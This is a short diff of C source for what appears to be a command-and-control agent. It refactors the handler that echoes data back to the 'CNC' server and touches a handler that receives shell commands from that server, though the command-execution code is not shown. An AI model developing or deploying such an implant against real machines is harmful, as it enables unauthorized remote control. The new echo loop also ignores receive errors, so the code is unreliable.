@@ -6,41 +6,28 @@
 #include "logger.h"
 #include "commander.h"
 
-#define OUTPUT_BUFSIZE 8192
-
 void handle_echo()
 {
-    int ret;
+    int ret, bytes_to_read;
     struct echo_cmd cmd;
 
     log_info("Received ECHO command.");
-    ret = recv_from_cnc(&cmd.text_len, sizeof(cmd.text_len));
-    if (ret != sizeof(cmd.text_len))
+    ret = recv_from_cnc(&cmd.bytes_remaining, sizeof(cmd.bytes_remaining));
+    if (ret != sizeof(cmd.bytes_remaining))
     {
         log_error("Received invalid text length.");
         return;
     }
-    cmd.text = malloc(cmd.text_len + 1);
-    if (!cmd.text)
+    while (cmd.bytes_remaining)
     {
-        log_error("Failed to allocate memory for the text.");
-        return;
-    }
-    ret = recv_from_cnc(cmd.text, cmd.text_len);
-    if (ret != cmd.text_len)
-    {
-        log_error("Received invalid text.");
-        return;
-    }
-    cmd.text[cmd.text_len] = 0;
-    log_info("Received echo: \"%s\"", cmd.text);
-
-    ret = send_to_cnc(cmd.text, cmd.text_len);
-    free(cmd.text);
-    if (ret != cmd.text_len)
-    {
-        log_error("Failed to send text to CNC.");
-        return;
+        bytes_to_read = min(cmd.bytes_remaining, sizeof(cmd.data));
+        ret = recv_from_cnc(cmd.data, bytes_to_read);
+        cmd.bytes_remaining -= ret;
+        if (send_to_cnc(cmd.data, ret) != ret)
+        {
+            log_error("Failed to echo the data.");
+            return;
+        }
     }
 }
 
@@ -49,7 +36,7 @@ void handle_shell()
     int ret;
     unsigned int bytes_read;
     struct shell_cmd cmd;
-    char out[OUTPUT_BUFSIZE];
+    char out[8192];
 
     log_info("Received SHELL command.");
     ret = recv_from_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len));
